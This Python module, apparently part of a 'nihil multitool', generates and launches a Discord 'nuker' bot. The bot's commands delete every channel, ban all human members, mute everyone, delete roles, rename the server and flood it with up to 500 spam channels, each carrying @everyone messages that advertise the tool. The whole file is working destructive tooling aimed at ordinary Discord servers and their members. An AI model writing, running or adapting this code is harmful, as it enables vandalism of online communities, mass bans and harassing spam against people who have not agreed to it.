import subprocess
import sys
import os
import threading

# Global process reference
bot_process = None
bot_token = None

def start(token):
    """Start the bot in a separate process"""
    global bot_process, bot_token
    
    # Get the path to nihil.jpg
    nihil_jpg_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'nihil.jpg')
    
    # Create the bot script content
    bot_script = f'''
import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
intents.typing = False
intents.presences = False

bot = commands.Bot(command_prefix='!', intents=intents)

# Path to nihil.jpg
NIHIL_JPG_PATH = r'{nihil_jpg_path.replace(chr(92), chr(92)+chr(92))}'

SPAM_MESSAGE = "@everyone get nuked by nihil multitool! https://github.com/igNovoline/Nihil"

@bot.event
async def on_ready():
    # Set bot profile
    try:
        with open(NIHIL_JPG_PATH, 'rb') as f:
            await bot.user.edit(username="nihil bot", avatar=f.read())
    except Exception as e:
        print(f"Could not set bot profile: {{e}}")
    
    print(f'BOT_ONLINE|{{bot.user}}')

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    if not message.content.startswith('!'):
        return
    
    args = message.content[1:].split()
    command = args[0].lower() if args else ''
    
    try:
        if command == 'delete':
            deleted = 0
            for channel in message.guild.channels:
                try:
                    await channel.delete()
                    deleted += 1
                except:
                    pass
            await message.channel.send(f'Deleted {{deleted}} channels')
        
        elif command == 'ban':
            banned = 0
            for member in message.guild.members:
                if member.bot:
                    continue
                try:
                    await member.ban(reason="Nuked")
                    banned += 1
                except:
                    pass
            await message.channel.send(f'Banned {{banned}} members')
        
        elif command == 'mute':
            muted = 0
            try:
                muted_role = await message.guild.create_role(name="Muted", color=discord.Color.grey())
                for channel in message.guild.channels:
                    try:
                        await channel.set_permissions(muted_role, send_messages=False, speak=False)
                    except:
                        pass
                for member in message.guild.members:
                    if member.bot:
                        continue
                    try:
                        await member.add_roles(muted_role)
                        muted += 1
                    except:
                        pass
            except Exception as e:
                await message.channel.send(f'Error: {{e}}')
                return
            await message.channel.send(f'Muted {{muted}} members')
        
        elif command == 'nuke':
            guild = message.guild
            
            # Delete ALL channels (text, voice, categories, etc.)
            for channel in guild.channels:
                try:
                    await channel.delete()
                except:
                    pass
            
            # Delete all roles (except @everyone)
            for role in guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.delete()
                    except:
                        pass
            
            # Set server name
            try:
                await guild.edit(name="nuked by nihil")
            except:
                pass
            
            # Set server icon
            try:
                with open(NIHIL_JPG_PATH, 'rb') as f:
                    await guild.edit(icon=f.read())
            except Exception as e:
                print(f"Could not set server icon: {{e}}")
            
            # Create as many channels as possible called "nuked-by-nihil"
            created_channels = 0
            max_channels = 500  # Discord limit
            
            for i in range(max_channels):
                try:
                    channel = await guild.create_text_channel("nuked-by-nihil")
                    created_channels += 1
                    # Spam the channel
                    for _ in range(5):  # Send 5 messages per channel
                        try:
                            await channel.send(SPAM_MESSAGE)
                        except:
                            pass
                except Exception as e:
                    print(f"Error creating channel {{i}}: {{e}}")
                    break
            
            await message.channel.send(f'NUKE COMPLETE! Created {{created_channels}} channels and spammed them!')
        
        else:
            await message.channel.send('Unknown command. Available: delete, ban, mute, nuke')
    
    except Exception as e:
        await message.channel.send(f'Error: {{e}}')

try:
    bot.run('{token}')
except Exception as e:
    print(f'BOT_ERROR|{{e}}')
'''
    
    # Write the script to a temp file and run it
    script_path = os.path.join(os.path.dirname(__file__), 'temp_bot.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(bot_script)
    
    # Start the bot process
    bot_process = subprocess.Popen(
        [sys.executable, script_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
    )
    
    bot_token = token
    
    # Start a thread to read output
    def read_output():
        for line in bot_process.stdout:
            print(line.rstrip())
    
    output_thread = threading.Thread(target=read_output, daemon=True)
    output_thread.start()
    
    return True

def stop():
    """Stop the bot"""
    global bot_process
    if bot_process:
        bot_process.terminate()
        bot_process = None
    return True

def is_running():
    """Check if bot is running"""
    return bot_process is not None and bot_process.poll() is None
